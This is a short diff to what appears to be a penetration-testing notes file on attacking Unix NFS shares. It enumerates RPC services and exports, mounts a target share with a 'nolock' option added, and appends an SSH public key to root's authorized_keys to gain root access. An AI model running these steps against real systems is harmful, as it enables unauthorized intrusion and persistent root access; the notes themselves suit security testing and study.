@@ -6,7 +6,7 @@ Unix
 rpcinfo -p <target-IP>
 
 showmount -e <target-IP>
-mount -t nfs <target-IP>:/share /mnt/tmp
+mount -t nfs -o nolock <target-IP>:/share /mnt/tmp
 
 cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
 
